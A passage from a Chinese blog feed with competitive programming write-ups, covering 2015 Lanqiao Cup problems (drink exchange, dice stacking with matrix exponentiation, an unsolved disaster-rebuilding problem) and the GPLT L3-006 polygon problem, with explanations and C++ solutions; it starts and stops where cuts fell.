10000）<br>输出：一个整数，表示实际得到的饮料数</p><p>例如：<br>用户输入：<br>100<br>程序应该输出：<br>149</p><p>用户输入：<br>101<br>程序应该输出：<br>151</p><p>资源约定：<br>峰值内存消耗 &lt; 256M<br>CPU消耗  &lt; 1000ms</p><p>请严格按要求输出，不要画蛇添足地打印类似：“请您输入…” 的多余内容。<br>所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。<br>注意: main函数需要返回0<br>注意: 只使用ANSI C/ANSI C++ 标准，不要调用依赖于编译环境或操作系统的特殊函数。<br>注意: 所有依赖的函数必须明确地在源文件中 #include <xxx>， 不能通过工程设置而省略常用头文件。<br>提交时，注意选择所期望的编译器类型。</xxx></p></blockquote><p>简单模拟<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> s,n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    s=n;</div><div class="line">    <span class="keyword">while</span> (n&gt;=<span class="number">3</span>) &#123;</div><div class="line">        s+=n/<span class="number">3</span>;</div><div class="line">        n=n/<span class="number">3</span>+n%<span class="number">3</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,s);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="9-垒骰子"><a href="#9-垒骰子" class="headerlink" title="9. 垒骰子"></a>9. 垒骰子</h3><p><a href="../2015lanqiao2">垒骰子题解</a></p><h3 id="10-灾后重建"><a href="#10-灾后重建" class="headerlink" title="10. 灾后重建"></a>10. 灾后重建</h3><blockquote><p>Pear市一共有N（&lt;=50000）个居民点，居民点之间有M（&lt;=200000）条双向道路相连。这些居民点两两之间都可以通过双向道路到达。这种情况一直持续到最近，一次严重的地震毁坏了全部M条道路。<br>震后，Pear打算修复其中一些道路，修理第i条道路需要Pi的时间。不过，Pear并不打算让全部的点连通，而是选择一些标号特殊的点让他们连通。<br>Pear有Q（&lt;=50000）次询问，每次询问，他会选择所有编号在[l,r]之间，并且 编号 mod K  = C 的点，修理一些路使得它们连通。由于所有道路的修理可以同时开工，所以完成修理的时间取决于花费时间最长的一条路，即涉及到的道路中Pi的最大值。</p><p>你能帮助Pear计算出每次询问时需要花费的最少时间么？这里询问是独立的，也就是上一个询问里的修理计划并没有付诸行动。</p><p>【输入格式】<br>第一行三个正整数N、M、Q，含义如题面所述。<br>接下来M行，每行三个正整数Xi、Yi、Pi，表示一条连接Xi和Yi的双向道路，修复需要Pi的时间。可能有自环，可能有重边。1&lt;=Pi&lt;=1000000。<br>接下来Q行，每行四个正整数Li、Ri、Ki、Ci，表示这次询问的点是[Li,Ri]区间中所有编号Mod Ki=Ci的点。保证参与询问的点至少有两个。</p><p>【输出格式】<br>输出Q行，每行一个正整数表示对应询问的答案。</p><p>【样例输入】<br>7 10 4<br>1 3 10<br>2 6 9<br>4 1 5<br>3 7 4<br>3 6 9<br>1 5 8<br>2 7 4<br>3 2 10<br>1 7 6<br>7 6 9<br>1 7 1 0<br>1 7 3 1<br>2 5 1 0<br>3 7 2 1</p><p>【样例输出】<br>9<br>6<br>8<br>8</p><p>【数据范围】<br>对于20%的数据，N,M,Q&lt;=30<br>对于40%的数据，N,M,Q&lt;=2000<br>对于100%的数据，N&lt;=50000,M&lt;=2*10^5,Q&lt;=50000. Pi&lt;=10^6.<br>Li,Ri,Ki均在[1,N]范围内，Ci在[0,对应询问的Ki)范围内。</p><p>资源约定：<br>峰值内存消耗 &lt; 256M<br>CPU消耗  &lt; 5000ms</p><p>请严格按要求输出，不要画蛇添足地打印类似：“请您输入…” 的多余内容。<br>所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。<br>注意: main函数需要返回0<br>注意: 只使用ANSI C/ANSI C++ 标准，不要调用依赖于编译环境或操作系统的特殊函数。<br>注意: 所有依赖的函数必须明确地在源文件中 #include <xxx>， 不能通过工程设置而省略常用头文件。<br>提交时，注意选择所期望的编译器类型。</xxx></p></blockquote><p>不会。。。看了<a href="http://blog.csdn.net/werkeytom_ftd/article/details/50839250" target="_blank" rel="noopener">好像挺靠谱的题解</a>感觉要写好久，而且不一定能写对，所以就先不加这题的代码了。。。</p><p>以上各题的解法和答案，如有错误，请及时指出，谢谢！</p>]]></content>
      
      
        <tags>
            
            <tag> 蓝桥杯 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2015年蓝桥杯省赛C/C++ A组 垒骰子</title>
      <url>/blog/2017/03/22/2015-lanqiao2/</url>
      <content type="html"><![CDATA[<h3 id="9-垒骰子"><a href="#9-垒骰子" class="headerlink" title="9. 垒骰子"></a>9. 垒骰子</h3><blockquote><p>赌圣atm晚年迷恋上了垒骰子，就是把骰子一个垒在另一个上边，不能歪歪扭扭，要垒成方柱体。<br>经过长期观察，atm发现了稳定骰子的奥秘：有些数字的面贴着会互相排斥！<br>我们先来规范一下骰子：1 的对面是 4，2 的对面是 5，3 的对面是 6。<br>假设有 m 组互斥现象，每组中的那两个数字的面紧贴在一起，骰子就不能稳定的垒起来。<br>atm想计算一下有多少种不同的可能的垒骰子方式。<br>两种垒骰子方式相同，当且仅当这两种方式中对应高度的骰子的对应数字的朝向都相同。<br>由于方案数可能过多，请输出模 10^9 + 7 的结果。<br>不要小看了 atm 的骰子数量哦～</p><p>「输入格式」<br>第一行两个整数 n m<br>n表示骰子数目<br>接下来 m 行，每行两个整数 a b ，表示 a 和 b 数字不能紧贴在一起。</p><p>「输出格式」<br>一行一个数，表示答案模 10^9 + 7 的结果。</p><p>「样例输入」<br>2 1<br>1 2</p><p>「样例输出」<br>544</p><p>「数据范围」<br>对于 30% 的数据：n &lt;= 5<br>对于 60% 的数据：n &lt;= 100<br>对于 100% 的数据：0 &lt; n &lt;= 10^9, m &lt;= 36</p><p>资源约定：<br>峰值内存消耗 &lt; 256M<br>CPU消耗  &lt; 2000ms</p><p>请严格按要求输出，不要画蛇添足地打印类似：“请您输入…” 的多余内容。<br>所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。<br>注意: main函数需要返回0<br>注意: 只使用ANSI C/ANSI C++ 标准，不要调用依赖于编译环境或操作系统的特殊函数。<br>注意: 所有依赖的函数必须明确地在源文件中 #include <xxx>， 不能通过工程设置而省略常用头文件。<br>提交时，注意选择所期望的编译器类型。</xxx></p></blockquote><p>这道题首先要会递推的做法。<br>很自然的，我们可以用$f[i][j]$表示垒了$i$个骰子，并且最上面的骰子$j$面朝上。<br>那么递推式就是$$f[i][j]=\sum_{k=1}^{6} f[i-1][k]\quad coop[op[j]][k]$$<br>其中$op[j]$表示$j$的背面，$coop[op[j]][k]$就表示$j$的背面是可以跟$k$放在一起的。<br>这样每次没有讨论侧面的朝向，所以最后乘以$4^n$。<br>如果想要实现的好的话还要使用滚动数组  <a href="http://www.cnblogs.com/acm-bingzi/p/3264883.html" target="_blank" rel="noopener">滚动数组资料</a></p><p>放一个搜到的代码吧。。。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="comment">// ...冲突记录: Compact[i][j]=false代表点数为i的面与点数为j的面存在冲突</span></div><div class="line"><span class="keyword">bool</span> Compact[<span class="number">7</span>][<span class="number">7</span>];</div><div class="line"></div><div class="line"><span class="comment">// ...Parner[i]=j代表 点数为i的面 的对立面点数为j</span></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> Parner[<span class="number">7</span>]=&#123; <span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;;</div><div class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> MOD = <span class="number">1000000007</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span>  N; <span class="comment">// 骰子高度</span></div><div class="line">    <span class="keyword">int</span> M; <span class="comment">// 冲突组数</span></div><div class="line">    <span class="keyword">int</span> s1,s2;</div><div class="line">    <span class="built_in">cin</span> &gt;&gt; N &gt;&gt; M;</div><div class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i)</div><div class="line">        <span class="keyword">for</span>( <span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">7</span>;++j)</div><div class="line">            Compact[i][j]=<span class="literal">true</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; ++i ) &#123;</div><div class="line">        <span class="built_in">cin</span> &gt;&gt; s1 &gt;&gt; s2;</div><div class="line">        <span class="comment">// ...点数为s1的面与点数为s2的面存在冲突</span></div><div class="line">        Compact[s1][s2] = Compact[s2][s1] = <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">2</span>][<span class="number">7</span>]; <span class="comment">// 滚动数组</span></div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> C = <span class="number">4</span>;</div><div class="line">    <span class="keyword">int</span> e = <span class="number">0</span>;          <span class="comment">// 滚动标志</span></div><div class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">        dp[e][i] = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="comment">// dp[i][j]代表高度为i的,顶面点数为j的叠骰子方案数</span></div><div class="line">    <span class="comment">// 在这里忽略每个骰子可以四面转向的情况, 把该情况留到最后乘上去就可以了</span></div><div class="line">    <span class="keyword">int</span> j,k;</div><div class="line">    <span class="keyword">for</span>( <span class="keyword">long</span> <span class="keyword">long</span> i = <span class="number">2</span>; i &lt;= N; ++i )&#123;</div><div class="line">        e = <span class="number">1</span>-e;    <span class="comment">// ...滚动处理</span></div><div class="line">        C = (C*<span class="number">4</span>)%MOD;</div><div class="line">        <span class="keyword">for</span>( j = <span class="number">1</span>; j &lt; <span class="number">7</span>; ++j )&#123;</div><div class="line">            dp[e][j] = <span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span>( k = <span class="number">1</span>; k &lt; <span class="number">7</span>; ++k)</div><div class="line">                <span class="keyword">if</span>( Compact[ Parner[j] ][k] )</div><div class="line">                    dp[e][j] += dp[<span class="number">1</span>-e][k];</div><div class="line">            dp[e][j]%=MOD;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</div><div class="line">        sum = (sum+dp[e][i])%MOD;</div><div class="line">    sum = (sum*C)%MOD;</div><div class="line">    <span class="built_in">cout</span> &lt;&lt; sum;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>核心代码的复杂度$T(n)=36n$，就算给了2s肯定也是不能全通过的，我们需要一个更快的方法。<br>分析可以发现其实每一步递推对应的关系都是一样的，就是最开始给出的那些关系。<br>所以我们可以用矩阵来进行递推，再使用快速幂即可  <a href="http://www.cnblogs.com/tmzbot/p/3930206.html" target="_blank" rel="noopener">矩阵递推资料</a></p><p>代码用了模板技术，大家凭感觉吧。。。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MO=<span class="number">1e9</span>+<span class="number">7</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> opps[]=&#123;<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> Mat &#123;</div><div class="line">    <span class="keyword">int</span> r,c;</div><div class="line">    ll el[<span class="number">10</span>][<span class="number">10</span>];</div><div class="line">    Mat() &#123;&#125;</div><div class="line">    Mat(ll x) &#123;</div><div class="line">        r=c=<span class="number">6</span>;</div><div class="line">        <span class="built_in">memset</span>(el,<span class="number">0</span>,<span class="keyword">sizeof</span>(el));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=r;i++) &#123;</div><div class="line">            el[i][i]=x;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    Mat(<span class="keyword">int</span> _r,<span class="keyword">int</span> _c,ll x) &#123;</div><div class="line">        r=_r;c=_c;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=r;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=c;j++) &#123;</div><div class="line">                el[i][j]=x;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    Mat <span class="keyword">operator</span> *(<span class="keyword">const</span> Mat &amp;b) &#123;</div><div class="line">        <span class="function">Mat <span class="title">res</span><span class="params">(r,b.c,<span class="number">0</span>)</span></span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=r;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=b.c;j++) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=c;k++) &#123;</div><div class="line">                    res.el[i][j]+=el[i][k]*b.el[k][j];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> res;</div><div class="line">    &#125;</div><div class="line">    Mat <span class="keyword">operator</span> %(<span class="keyword">const</span> <span class="keyword">int</span> Mo) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=r;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=c;j++) &#123;</div><div class="line">                el[i][j]=el[i][j]%Mo;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> (*<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=r;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=c;j++) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%I64d "</span>,el[i][j]);</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> DataType&gt;</div><div class="line"><span class="function">DataType <span class="title">fpow</span><span class="params">(DataType x,<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function">DataType <span class="title">res</span><span class="params">(<span class="number">1</span>)</span></span>;</div><div class="line">    <span class="keyword">while</span> (n) &#123;</div><div class="line">        <span class="keyword">if</span> (n&amp;<span class="number">1</span>) &#123;</div><div class="line">            res=x*res%MO;</div><div class="line">        &#125;</div><div class="line">        x=x*x%MO;</div><div class="line">        n&gt;&gt;=<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m;</div><div class="line">    <span class="function">Mat <span class="title">coop</span><span class="params">(<span class="number">6</span>,<span class="number">6</span>,<span class="number">1</span>)</span></span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</div><div class="line">        <span class="keyword">int</span> x,y;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;y);</div><div class="line">        coop.el[x][opps[y]]=<span class="number">0</span>;</div><div class="line">        coop.el[y][opps[x]]=<span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    coop=fpow(coop,n<span class="number">-1</span>);</div><div class="line">    <span class="function">Mat <span class="title">cnt</span><span class="params">(<span class="number">6</span>,<span class="number">1</span>,<span class="number">1</span>)</span></span>;</div><div class="line">    cnt=coop*cnt%MO;</div><div class="line">    ll ans=<span class="number">0</span>,fo=<span class="number">4</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">6</span>;i++) &#123;</div><div class="line">        ans=(ans+cnt.el[i][<span class="number">1</span>])%MO;</div><div class="line">    &#125;</div><div class="line">    ans=ans*fpow(fo,n)%MO;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>,ans);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> 蓝桥杯 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>天梯赛练习集 L3-006 迎风一刀斩</title>
      <url>/blog/2017/03/14/gplt-L3-006/</url>
      <content type="html"><![CDATA[<h3 id="迎风一刀斩"><a href="#迎风一刀斩" class="headerlink" title="迎风一刀斩"></a><a href="https://www.patest.cn/contests/gplt/L3-006" target="_blank" rel="noopener">迎风一刀斩</a></h3><p>看到这题的时候一脸懵逼。。。后来才发现原来旋转角度只有90度、180度、或270度。。。不过还是查了一下题解。。。</p><p>其实只有四种情况，只要会画就差不多会写了。</p><p><img src="http://img.blog.csdn.net/20170314192751351" alt="这里写图片描述"></p><p>解释一下代码。。。<br><code>check()</code>可以通过引用返回横向的长(X)短(x)边，纵向的长(Y)短(y)边，以及平行坐标轴的边数(strt)。<br><code>penta()</code>本来是用来判断五边形和三角形的，后来发现前三个写起来都一样就都合在一起了。<br><code>quaqua()</code>用来判断两个四边形能不能拼成矩形，其中两个矩形是一种特殊情况 ，如果一个的边长是(A, B)，另一个是(X, Y)，只要A/B中的一个和X/Y中的一个相等就可以了。<br>其他一般的情况都是通过图中的相等关系判断的。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; PII;</div><div class="line">PII a[<span class="number">6</span>],b[<span class="number">6</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">input</span><span class="params">(PII a[],<span class="keyword">int</span> &amp;n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        <span class="keyword">int</span> x,y;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;y);</div><div class="line">        a[i]=PII(x,y);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(PII a[],<span class="keyword">int</span> n,<span class="keyword">int</span> &amp;X,<span class="keyword">int</span> &amp;x,<span class="keyword">int</span> &amp;Y,<span class="keyword">int</span> &amp;y,<span class="keyword">int</span> &amp;strt)</span></span></div><div class="line">&#123;</div><div class="line">    X=x=Y=y=strt=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (a[i].first==a[(i+<span class="number">1</span>)%n].first) &#123;</div><div class="line">            strt++;</div><div class="line">            <span class="keyword">int</span> tmp=<span class="built_in">abs</span>(a[i].second-a[(i+<span class="number">1</span>)%n].second);</div><div class="line">            <span class="keyword">if</span> (tmp&gt;Y) y=Y,Y=tmp;</div><div class="line">            <span class="keyword">else</span> y=tmp;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a[i].second==a[(i+<span class="number">1</span>)%n].second) &#123;</div><div class="line">            strt++;</div><div class="line">            <span class="keyword">int</span> tmp=<span class="built_in">abs</span>(a[i].first-a[(i+<span class="number">1</span>)%n].first);</div><div class="line">            <span class="keyword">if</span> (tmp&gt;X) x=X,X=tmp;</div><div class="line">            <span class="keyword">else</span> x=tmp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">penta</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> x,X,y,Y,strt;</div><div class="line">    check(b,m,X,x,Y,y,strt);</div><div class="line">    <span class="keyword">if</span> (strt!=m<span class="number">-1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">int</span> A=Y-y,B=X-x;</div><div class="line">    check(a,n,X,x,Y,y,strt);</div><div class="line">    <span class="keyword">if</span> (strt!=n<span class="number">-1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">return</span> (X==A&amp;&amp;Y==B)||(X==B&amp;&amp;Y==A);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">quaqua</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> x,X,y,Y,strt;</div><div class="line">    check(b,<span class="number">4</span>,X,x,Y,y,strt);</div><div class="line">    <span class="keyword">if</span> (strt&lt;<span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">if</span> (strt==<span class="number">4</span>) &#123;</div><div class="line">        <span class="keyword">int</span> A=X,B=Y;</div><div class="line">        check(a,<span class="number">4</span>,X,x,Y,y,strt);</div><div class="line">        <span class="keyword">if</span> (strt!=<span class="number">4</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">        <span class="keyword">return</span> A==X||A==Y||B==X||B==Y;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> height,A,B;</div><div class="line">    <span class="keyword">if</span> (y==<span class="number">0</span>) &#123;</div><div class="line">        height=Y;A=X;B=x;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        height=X;A=Y;B=y;</div><div class="line">    &#125;</div><div class="line">    check(a,<span class="number">4</span>,X,x,Y,y,strt);</div><div class="line">    <span class="keyword">if</span> (strt&lt;<span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">if</span> (y==<span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">return</span> height==Y&amp;&amp;x+A==X+B;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> height==X&amp;&amp;y+A==Y+B;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        